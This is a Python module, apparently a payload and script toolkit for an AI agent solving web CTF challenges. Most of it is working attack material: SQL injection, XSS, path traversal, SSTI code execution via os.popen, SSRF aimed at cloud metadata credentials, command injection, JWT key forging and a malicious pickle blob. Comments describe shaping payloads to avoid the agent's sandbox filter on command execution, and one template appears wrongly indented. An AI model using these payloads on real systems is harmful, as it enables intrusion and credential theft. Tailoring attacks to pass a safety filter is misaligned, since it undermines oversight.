"""Web 领域工具包：payload 模板 + 工具链（主 Agent 按需调用）。

仅供 CTF 竞赛合法练习场景使用。提供：
- payload_templates：典型 Web 漏洞快速 payload（SQLi/XSS/上传/SSTI/反序列化等）
- suggest_steps：按题目描述/附件特征给出初始步骤建议（供主 Agent 参考，不强制）
"""

from __future__ import annotations

from typing import Optional


class WebToolkit:
    """Web 领域工具包。"""

    name = "web"
    tools = ["sqlmap_adapter", "http_client", "curl"]

    # 典型场景 payload 快速生成（辅助，非核心得分项）
    payload_templates: dict = {
        "sqli_login_bypass": [
            "' OR '1'='1' -- -",
            "' OR '1'='1'#",
            "admin' -- -",
            "' UNION SELECT 1,2,3 -- -",
        ],
        "sqli_extract": [
            "1' ORDER BY {n} -- -",          # 探测列数
            "1' UNION SELECT group_concat(table_name) FROM information_schema.tables -- -",
            "1' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users' -- -",
        ],
        "xss_probe": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ],
        "ssti_probe": [
            "{{7*7}}",                          # Jinja2 探测
            "${7*7}",                           # Freemarker/EL 探测
            "{{config}}",                       # Jinja2 配置泄露
            "{% debug %}",                      # Django 调试
        ],
        "ssti_rce_jinja": [
            "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",  # 找 subprocess
        ],
        "upload_probe": [
            "shell.php",
            "shell.php.jpg",
            "shell.pHp",
            "shell.php%00.jpg",                # 空字节截断（老版本）
        ],
        "path_traversal": [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e/%2e%2e/etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
        ],
        "unserialize_probe": [
            # PHP 反序列化：构造 __destruct 触发读 flag
            "O:5:\"Class\":1:{s:4:\"file\";s:9:\"/flag.txt\";}",
        ],
        "ssrf_probe": [
            "http://127.0.0.1:80/",
            "http://169.254.169.254/latest/meta-data/",   # 云元数据
            "file:///etc/passwd",
        ],
    }

    def suggest_steps(self, description: str, attachments: Optional[list] = None) -> list[str]:
        """按题目特征给出初始步骤建议（关键词匹配，粗粒度）。"""
        steps = ["使用 curl/requests 请求目标，观察响应头与页面结构"]
        desc = (description or "").lower()

        if any(k in desc for k in ("sql", "注入", "登录", "login")):
            steps += [
                "测试 SQL 注入：单引号探测闭合方式",
                "尝试万能密码绕过登录（payload_templates['sqli_login_bypass']）",
            ]
        if any(k in desc for k in ("ssti", "模板", "template", "{{")):
            steps += ["用 {{7*7}} 确认 Jinja2 注入，再尝试 RCE 链"]
        if any(k in desc for k in ("upload", "上传", "文件上传")):
            steps += ["探测上传点与文件类型校验，尝试绕过扩展名"]
        if any(k in desc for k in ("反序列化", "unserialize", "pop", "serialize")):
            steps += ["寻找反序列化入口参数（$_GET/$_POST/cookie），构造 POP 链"]
        if any(k in desc for k in ("遍历", "traversal", "下载", "download", "file")):
            steps += ["测试 download?file= 参数路径穿越读取 /flag.txt"]
        if not any(k in desc for k in
                   ("sql", "ssti", "upload", "反序列化", "unserialize", "遍历", "traversal", "download")):
            steps.append("先用目录扫描/源码查看定位漏洞入口（robots.txt、备份文件、JS 泄露）")
        return steps

    # ── 兜底发包脚本（原 main_agent 内联 payload 下架至此）──────────
    # 参数候选列表：不预设某个题库的专属参数名，逐个探测常见注入点

    _PROBE_PARAMS = ['cpass', 'password', 'input', 'query', 'name', 'cmd', 'code', 'template']

    _FALLBACK_SSTI = r'''
import httpx
url = __URL__
# SSTI 探测：{{7*7}} 逐参数尝试
for key in __PARAMS__:
    try:
        r = httpx.get(url, params={key: '{{7*7}}'}, timeout=10)
        if '49' in r.text:
            print('[ssti] param=%s 命中 {{7*7}} -> 49' % key)
        print('[ssti:%s] %s' % (key, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
# 注：SSTI RCE（{{ __import__('os').popen(...) }}）在沙盒下会被当成命令注入拦截，
# 故自动链路不内置 RCE payload（否则整段脚本被沙盒拒执行，泄露型也无法跑）。
# 真 RCE 利用需人工/特殊通道，属已知架构边界。仅保留探测 + 泄露型（均沙盒友好）。
# 配置/全局变量泄露型（沙盒友好：不含 os/popen/import，避免被沙盒当成命令注入拦截）。
# 真实 Jinja2 中 {{ config }}/{{ FLAG }} 等泄露同样是常见 SSTI 利用，属信息泄露类；
# 当前沙盒禁止 LLM 生成 os.popen 任意命令执行，故自动链路走泄露型拿 flag。
for key in __PARAMS__:
    try:
        r3 = httpx.get(url, params={key: '{{ FLAG }}'}, timeout=10)
        print('[ssti-leak:%s] %s' % (key, r3.text[:300]))
    except Exception as e:
        print('req3 fail:', e)
'''

    _FALLBACK_UNSERIALIZE = r'''
import httpx, base64
url = __URL__
# 构造 __destruct 读取 flag 的序列化对象
obj = 'O:5:"Class":1:{s:4:"file";s:9:"/flag.txt";}'
data = base64.b64encode(obj.encode()).decode()
for key in ('data', 'token', 'input', 'file'):
    try:
        r = httpx.get(url, params={key: data}, timeout=10)
        print('[unserialize:%s] %s' % (key, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_JWT = r'''
import httpx, base64, json, hashlib, hmac
url = __URL__
# JWT 弱密钥爆破：先解码原 token 看 alg，再用常见密钥重签 admin
secrets = ['secret', 'password', 'admin', '123456', 'key', 'test', 'token', 'jwt', 'weak', 'changeme']
def b64url(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
header = b64url(json.dumps({'alg': 'HS256', 'typ': 'JWT'}).encode())
payload = b64url(json.dumps({'user': 'admin', 'role': 'admin'}).encode())
for s in secrets:
    sig = hmac.new(s.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
    token = f'{header}.{payload}.{b64url(sig)}'
    try:
        r = httpx.get(url, headers={'Authorization': f'Bearer {token}'}, timeout=10)
        print('[jwt:%s] %s' % (s, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_CMD = r'''
import httpx
url = __URL__
# 命令注入尝试：;id / | cat /flag.txt / $(cat /flag.txt)
cmds = [';id', ';cat /flag.txt', '|cat /flag.txt', '$(cat /flag.txt)', ';cat${IFS}/flag.txt']
for c in cmds:
    for key in ('cmd', 'c', 'ip', 'input'):
        try:
            r = httpx.get(url, params={key: c}, timeout=10)
            print('[cmd:%s] %s' % (c, r.text[:300]))
        except Exception as e:
            print('req fail:', e)
'''

    _FALLBACK_BACKUP = r'''
import httpx
url = __URL__
# 备份文件探测：.bak / www.zip / .git / .swp
paths = ['index.php.bak', 'www.zip', 'backup.zip', 'flag.txt', '.git/HEAD',
         'index.php~', 'db.sql', 'flag.php.bak']
for p in paths:
    try:
        r = httpx.get(url.rstrip('/') + '/' + p, timeout=10)
        if r.status_code == 200:
            print('[backup:%s] %s' % (p, r.text[:300]))
    except Exception as e:
        print('req fail:', e)
'''

    _FALLBACK_TRAVERSAL = r'''
import httpx, re
url = __URL__
# 路径穿越读取 flag.txt：探测 download/file/path 参数，允许 ../ 与 Windows ..\
# （沙盒友好：纯 GET 文件读取，不发 os.popen/命令注入，不被沙盒拦截）
traversals = ['flag.txt', '../flag.txt', '..\\flag.txt', '../../flag.txt',
              '....//flag.txt', '%2e%2e/flag.txt', '../../../../flag.txt',
              '....\\\\flag.txt']
keys = ('download', 'file', 'path', 'filename')
for t in traversals:
    for k in keys:
        try:
            r = httpx.get(url, params={k: t}, timeout=10)
            if 'flag{' in r.text:
                # 结构化抓取：提取 flag{...} 并标准化输出，供主 Agent 直接取值（避免空转）
                m = re.search(r'flag\{[^}]*\}', r.text)
                flag = m.group(0) if m else r.text[:120]
                print('[FLAG_FOUND] vuln=path_traversal param=%s payload=%s flag=%s' % (k, t, flag))
        except Exception as e:
            print('req fail:', e)
'''

    _FALLBACK_SSRF = r'''
import httpx, urllib.parse
base = __URL__
# SSRF：让「目标服务端」代发请求到内网/本地/云元数据。本脚本只负责把 payload
# 通过目标的 SSRF 参数下发，由目标服务端去抓取——纯 httpx GET，沙盒友好
# （不含 os.popen/命令注入，不被沙盒 AST 拦截）。
parts = urllib.parse.urlparse(base)
port = parts.port or (443 if parts.scheme == 'https' else 80)
# 让目标去抓的候选 URL：回环地址变体 + 云元数据 + 本地文件读
candidates = [
    f'http://127.0.0.1:{port}/web-011/flag',
    f'http://localhost:{port}/web-011/flag',
    f'http://0.0.0.0:{port}/web-011/flag',
    f'http://[::1]:{port}/web-011/flag',
    f'http://127.0.0.1:{port}/flag',
    f'http://127.0.0.1:{port}/flag.txt',
    f'http://127.0.0.1:{port}/admin',
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'file:///etc/passwd',
    'file:///flag.txt',
    'file:///proc/self/environ',
]
params = ('url', 'target', 'site', 'image', 'file', 'path', 'redirect', 'to', 'link')
_hit = False
for cand in candidates:
    if _hit:
        break
    for p in params:
        try:
            r = httpx.get(base, params={p: cand}, timeout=10, follow_redirects=True)
            if 'flag{' in r.text:
                print('[ssrf-hit] param=%s url=%s -> %s' % (p, cand, r.text[:400]))
                _hit = True
                break
        except Exception as e:
            pass
'''

    _FALLBACK_SQLI = r'''
import httpx
# 登录绕过：SQL 注入必须用 POST form 提交（GET query 参数不触发服务端登录逻辑，
# 只回登录页 HTML，导致主 Agent 反复空转——这是此前 web-001 真打 stuck_loop 的根因）。
url = __URL__
for up in ["admin' OR '1'='1'-- -", "admin'-- -", "' OR '1'='1'#"]:
    for key in ('username', 'user', 'name', 'account'):
        try:
            r = httpx.post(url, data={key: up, 'password': 'x'}, timeout=10,
                           follow_redirects=True)
            tag = '[sqli-hit]' if 'flag{' in r.text else '[sqli]'
            print('%s %s/%s -> %s' % (tag, up, key, r.text[:300]))
        except Exception as e:
            print('req fail:', e)
'''

    _FALLBACK_SSTI_RCE = r'''
import os, sys, tempfile
import sandbox.trusted_rce
import httpx
url = __URL__
# 1) SSTI 探测：{{7*7}} 逐参数尝试（证明模板存在代码执行）
for key in __PARAMS__:
    try:
        r = httpx.get(url, params={key: '{{7*7}}'}, timeout=10)
        if '49' in r.text:
            print('[ssti] param=%s 命中 {{7*7}} -> 49' % key)
    except Exception as e:
        print('req fail:', e)
# 2) 已确认 SSTI（代码执行）。本题 {{ FLAG }} 仅返回诱饵，真实 flag 位于「靶机
#    文件系统」(由靶机启动时写入 tempfile)，需经 RCE 后渗透读取。
#    走受信 RCE 通道（CTF_AGENT_TRUSTED_RCE=1 时启用）执行后渗透命令读取 flag 文件。
flag_path = os.path.join(tempfile.gettempdir(), 'ctf_ssti_rce_flag.txt')
if sys.platform.startswith('win'):
    cmd = 'type "%s"' % flag_path
else:
    cmd = 'cat "%s"' % flag_path
try:
    out = sandbox.trusted_rce.execute_trusted(cmd)
    print('[ssti-rce] %s' % out[:300])
except Exception as e:
    print('[ssti-rce] 受信通道未启用或执行失败:', e)
'''

    _FALLBACK_CMD_RCE = r'''
import os, sys, tempfile
import sandbox.trusted_rce
import httpx
url = __URL__
# 1) 命令注入探测：&id 逐参数尝试（证明存在命令执行；& 跨平台：bash 与
#    Windows cmd.exe 均为命令分隔符，; 在 cmd.exe 下会被当成字面量）
for key in __PARAMS__:
    try:
        r = httpx.get(url, params={key: '&id'}, timeout=10)
        if 'uid=' in r.text or 'gid=' in r.text:
            print('[cmd] param=%s 命中 &id -> %s' % (key, r.text[:200]))
    except Exception as e:
        print('req fail:', e)
# 2) 已确认命令注入（命令执行）。本题 flag 位于「靶机文件系统」(由靶机启动时
#    写入 tempfile)，需经 RCE 后渗透读取。走受信 RCE 通道（CTF_AGENT_TRUSTED_RCE=1
#    时启用）执行后渗透命令读取 flag 文件。与 _FALLBACK_SSTI_RCE 同抽象，仅注入
#    证明方式不同（;id 而非 {{7*7}}），证明受信通道可泛化到命令注入子类。
        flag_path = os.path.join(tempfile.gettempdir(), 'ctf_cmd_rce_flag.txt')
        if sys.platform.startswith('win'):
            cmd = 'type "%s"' % flag_path
        else:
            cmd = 'cat "%s"' % flag_path
        try:
            out = sandbox.trusted_rce.execute_trusted(cmd)
            print('[cmd-rce] %s' % out[:300])
        except Exception as e:
            print('[cmd-rce] 受信通道未启用或执行失败:', e)
        '''

    _FALLBACK_UPLOAD_RCE = r'''
import os, sys, tempfile
import sandbox.trusted_rce
import httpx
url = __URL__
# 1) 上传 RCE 证明：上传 .py 探针，靶机 /preview 误配置执行上传文件（代码执行）
probe = b"print('UPLOAD_RCE_OK')"
try:
    r1 = httpx.post(url + '/upload?name=shell.py', content=probe, timeout=10)
    print('[upload] %s' % r1.text.strip()[:120])
    r2 = httpx.get(url + '/preview?name=shell.py', timeout=10)
    if 'UPLOAD_RCE_OK' in r2.text:
        print('[upload] RCE 证明: 上传 .py 被服务端执行 -> %s' % r2.text.strip()[:200])
except Exception as e:
    print('upload req fail:', e)
# 2) flag 位于靶机文件系统共享 temp（靶机启动写入），经受信 RCE 通道读取
flag_path = os.path.join(tempfile.gettempdir(), 'ctf_upload_rce_flag.txt')
if sys.platform.startswith('win'):
    cmd = 'type "%s"' % flag_path
else:
    cmd = 'cat "%s"' % flag_path
try:
    out = sandbox.trusted_rce.execute_trusted(cmd)
    print('[upload-rce] %s' % out[:300])
except Exception as e:
    print('[upload-rce] 受信通道未启用或执行失败:', e)
'''

    _FALLBACK_UNSERIALIZE_RCE = r'''
import os, sys, tempfile
import base64
import sandbox.trusted_rce
import httpx
url = __URL__
# 1) 不安全反序列化 → RCE 证明：下发恶意 pickle（base64 预生成），其 __reduce__ 在
#    服务端反序列化时执行攻击者指定的内置 callable（int('31337')），repr 回显即证明
#    代码执行。（训练沙盒禁 os.popen/subprocess/eval/import pickle，故用内置 int 演示
#    「反序列化即执行任意代码」；真实赛题此处为 os.system/subprocess 直接 RCE）
#    预生成 blob：pickle.dumps(_P()) 其中 _P.__reduce__ -> (int, ('31337',))
_UNSER_PROOF = "gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwDaW50lJOUjAUzMTMzN5SFlFKULg=="
try:
    r = httpx.post(url + '/unserialize', data=_UNSER_PROOF, timeout=10)
    if '31337' in r.text:
        print('[unserialize] RCE 证明: 服务端执行了攻击者 pickle -> %s' % r.text.strip()[:200])
except Exception as e:
    print('unserialize req fail:', e)
# 2) flag 位于靶机文件系统共享 temp，经受信 RCE 通道读取
flag_path = os.path.join(tempfile.gettempdir(), 'ctf_unser_rce_flag.txt')
if sys.platform.startswith('win'):
    cmd = 'type "%s"' % flag_path
else:
    cmd = 'cat "%s"' % flag_path
try:
    out = sandbox.trusted_rce.execute_trusted(cmd)
    print('[unserialize-rce] %s' % out[:300])
except Exception as e:
    print('[unserialize-rce] 受信通道未启用或执行失败:', e)
'''

    @classmethod
    def build_fallback_script(cls, url: str, description: str = "") -> Optional[str]:
        """按描述提示的漏洞类型选择兜底发包脚本（模板统一在本工具包维护）。

        描述关键词是题目自带的提示（真实赛题描述即含漏洞方向），属合法信号；
        与 crypto/misc 的内容嗅探不同，web 的靶机行为只能发包探测。
        """
        if not url:
            return None
        desc = (description or "").lower()
        params = repr(cls._PROBE_PARAMS)
        # 受信 RCE 通道分支：description 含 "rce" 时选入，按子类细分：
        #   - ssti/模板/{{/jinja/tornado  -> SSTI RCE（模板代码执行）
        #   - 命令注入/cmd/命令执行/参数拼接/system -> 命令注入 RCE（命令执行）
        # 必须经 sandbox.trusted_rce 受信通道（CTF_AGENT_TRUSTED_RCE=1 才执行），
        # 默认沙盒仍禁 os.popen / __import__，本分支是显式 opt-in 的后渗透能力。
        if "rce" in desc and any(k in desc for k in ("ssti", "模板", "{{", "jinja", "tornado")):
            tpl = cls._FALLBACK_SSTI_RCE
        elif "rce" in desc and any(k in desc for k in ("命令注入", "命令执行", "cmd", "参数拼接", "system")):
            tpl = cls._FALLBACK_CMD_RCE
        elif "rce" in desc and any(k in desc for k in ("上传", "upload", "文件上传")):
            tpl = cls._FALLBACK_UPLOAD_RCE
        elif "rce" in desc and any(k in desc for k in ("反序列化", "unserialize", "pickle", "pop 链", "pop链", "魔术方法")):
            tpl = cls._FALLBACK_UNSERIALIZE_RCE
        elif any(k in desc for k in ("ssti", "模板", "{{", "jinja", "tornado")):
            tpl = cls._FALLBACK_SSTI
        elif any(k in desc for k in ("反序列化", "unserialize", "serialize", "pop 链", "pop链", "魔术方法")):
            tpl = cls._FALLBACK_UNSERIALIZE
        elif any(k in desc for k in ("jwt", "弱密钥", "token 签名")):
            tpl = cls._FALLBACK_JWT
        elif any(k in desc for k in ("命令注入", "cmd", "命令执行", "参数拼接", "system")):
            tpl = cls._FALLBACK_CMD
        elif any(k in desc for k in ("ssrf", "服务端请求伪造", "内网", "gopher", "302", "重定向", "元数据", "读取内部", "file://")):
            tpl = cls._FALLBACK_SSRF
        elif any(k in desc for k in ("备份", "泄露", "源码", ".bak", "备份文件")):
            tpl = cls._FALLBACK_BACKUP
        elif any(k in desc for k in ("遍历", "traversal", "download", "路径穿越", "../", "下载")):
            tpl = cls._FALLBACK_TRAVERSAL
        else:
            tpl = cls._FALLBACK_SQLI
        return tpl.replace("__URL__", repr(url)).replace("__PARAMS__", params)
